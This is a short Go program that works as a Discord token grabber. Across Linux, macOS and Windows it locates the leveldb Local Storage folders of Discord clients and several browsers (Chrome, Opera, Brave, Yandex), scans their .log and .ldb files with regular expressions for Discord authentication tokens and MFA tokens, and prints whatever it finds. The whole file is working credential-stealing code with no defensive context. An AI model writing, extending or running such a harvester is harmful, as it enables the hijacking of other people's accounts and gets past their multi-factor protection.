package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
)

func hasEnding(fullString, ending string) bool {
	return strings.HasSuffix(fullString, ending)
}

func pathExists(s string) bool {
	_, err := os.Stat(s)
	return err == nil
}

func searchTokens(filePath string, tokenRegex *regexp.Regexp) []string {
	matchedTokens := []string{}

	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Printf("Error: Unable to open the file %s\n", filePath)
		return matchedTokens
	}

	accumulatedData := string(fileData)
	fmt.Printf("Looking for tokens in: \x1B[35m%s\x1B[0m\n", filePath)

	matches := tokenRegex.FindAllString(accumulatedData, -1)
	matchedTokens = append(matchedTokens, matches...)

	return matchedTokens
}

func grabPath() []string {
	system := runtime.GOOS
	fmt.Printf("Operating System detected: \x1B[0;36m%s\x1B[0m\n", system)

	targetLocations := []string{}

	switch system {
	case "linux":
		home := os.Getenv("HOME")
		if home == "" {
			home = "/home"
		}

		paths := []string{
			filepath.Join(home, ".discord"),
			filepath.Join(home, ".discordcanary"),
			filepath.Join(home, ".discordptb"),
			filepath.Join(home, ".config/google-chrome/Default"),
			filepath.Join(home, ".config/opera/Default"),
			filepath.Join(home, ".config/BraveSoftware/Brave-Browser/Default"),
			filepath.Join(home, ".config/yandex-browser/Default"),
		}

		targetLocations = append(targetLocations, paths...)

	case "darwin":
		local := os.Getenv("HOME")
		if local != "" {
			local += "/Library/Application Support"
		}

		paths := []string{
			filepath.Join(local, "Discord"),
			filepath.Join(local, "discordcanary"),
			filepath.Join(local, "discordptb"),
			filepath.Join(local, "Google/Chrome/Default"),
			filepath.Join(local, "com.operasoftware.Opera"),
			filepath.Join(local, "BraveSoftware/Brave-Browser/Default"),
			filepath.Join(local, "Yandex/YandexBrowser/Default"),
		}

		targetLocations = append(targetLocations, paths...)

	case "windows":
		roaming := os.Getenv("APPDATA")
		local := os.Getenv("LOCALAPPDATA")

		paths := []string{
			filepath.Join(roaming, "Discord"),
			filepath.Join(roaming, "discordcanary"),
			filepath.Join(roaming, "discordptb"),
			filepath.Join(local, "Google/Chrome/User Data/Default"),
			filepath.Join(roaming, "Opera Software/Opera Stable"),
			filepath.Join(local, "BraveSoftware/Brave-Browser/User Data/Default"),
			filepath.Join(local, "Yandex/YandexBrowser/User Data/Default"),
		}

		targetLocations = append(targetLocations, paths...)

	default:
		fmt.Printf("Unsupported operating system: %s\n", system)
	}

	return targetLocations
}

func main() {
	tokens := []string{}
	mfas := []string{}
	paths := grabPath()

	for i := range paths {
		paths[i] = filepath.Join(paths[i], "Local Storage/leveldb")
  }

	tokenRegex := regexp.MustCompile(`([\w-]{24}\.[\w-]{6}\.[\w-]{27})`)
	mfaRegex := regexp.MustCompile(`mfa\.[\w-]{84}`)

	for _, path := range paths {
		if pathExists(path) {
			entries, err := ioutil.ReadDir(path)
			if err == nil {
				for _, entry := range entries {
					entryPath := entry.Name()
					if hasEnding(entryPath, ".log") || hasEnding(entryPath, ".ldb") {
						storedTokens := searchTokens(filepath.Join(path, entryPath), tokenRegex)
						storedMFA := searchTokens(filepath.Join(path, entryPath), mfaRegex)

						tokens = append(tokens, storedTokens...)
						mfas = append(mfas, storedMFA...)
					}
				}
			}
		}
	}

	fmt.Println("Tokens found:")
	for _, token := range tokens {
		fmt.Printf("\x1B[32m%s\x1B[0m\n", token)
	}

	fmt.Println("MFA found:")
	for _, mfa := range mfas {
		fmt.Printf("\x1B[32m%s\x1B[0m\n", mfa)
	}
}

